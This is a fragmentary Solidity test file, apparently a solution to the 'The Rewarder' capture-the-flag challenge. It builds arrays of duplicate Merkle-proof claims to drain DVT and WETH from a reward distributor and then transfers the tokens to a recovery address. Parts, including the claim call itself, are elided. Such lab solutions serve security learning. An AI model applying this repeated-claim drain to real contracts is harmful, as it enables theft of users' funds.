...
contract TheRewarderChallenge is Test {
    ...
    console.log("address player",player);
    //load leaves and add player data (index1)
    bytes32 [] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
    bytes32 [] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
	...
	uint256 loopsDVT = (remainingDVT / playerDvtAmount);
	uint256 loopsWETH = (remainingWETH / playerWethAmount);

	console.log("Tokens remaining in the Distribuitor DVT", remainingDVT);
	console.log("Claims repeat needed to DVT", loopsDVT);
	console.log("Tokens remianing in the Distribuitor WETH", remainingWETH);
	console.log("Claims repeat needed to WETH", loopsWETH);

	//Make masive array of claims
	Claim[] memory dvtClaims = new Claim[](loopsDVT);
	Claim[] memory wethClaims = new Claim[](loopsWETH);
	...
	console.log("---Executing DVT  Claims ---");

	
	for (uint256 i = 0; i < loopsDVT; i++) {
	dvtClaims[i] = Claim({
		batchNumber: 0,
		amount: playerDvtAmount,
		tokenIndex: 0, // Dvt index
		proof: dvtProof	
	});
    ...
    console.log("--Execution WETH Claims --");
    
	
	for (uint256 i = 0; i < loopsWETH; i++) {
	wethClaims[i] = Claim({
	    batchNumber: 0,
	    amount: playerWethAmount,
	    tokenIndex: 1, //Weth index,
	    proof: wethProof
	});	
    ...
    //--details logs in executation--

    console.log("\n-- Up transaction at Distribution---");
    console.log("Note: Review values 0, 1, the vault in change tokenIndex, and last");

    //To can see logs into of own distribuitor, Foundry permited.
    //view the flux of player balance before and later of named

    uint256 balanceDvtBefore = dvt.balanceOf(player);
    uint256 balanceWethBefore = weth.balanceOf(player);

    //execute masive claim
	
	console.log("Balance of DVT of player later of attack", dvt.balanceOf(player) - balanceDvtBefore);
	console.log("Balance of WETH of player later of attack", weth.balanceOf(player) - balanceWethBefore);

	//4. send  to recovery  to win  the challenge
	dvt.transfer(recovery, dvt.balanceOf(player));
	weth.transfer(recovery, weth.balanceOf(player));

	console.log("---challenge finally--");
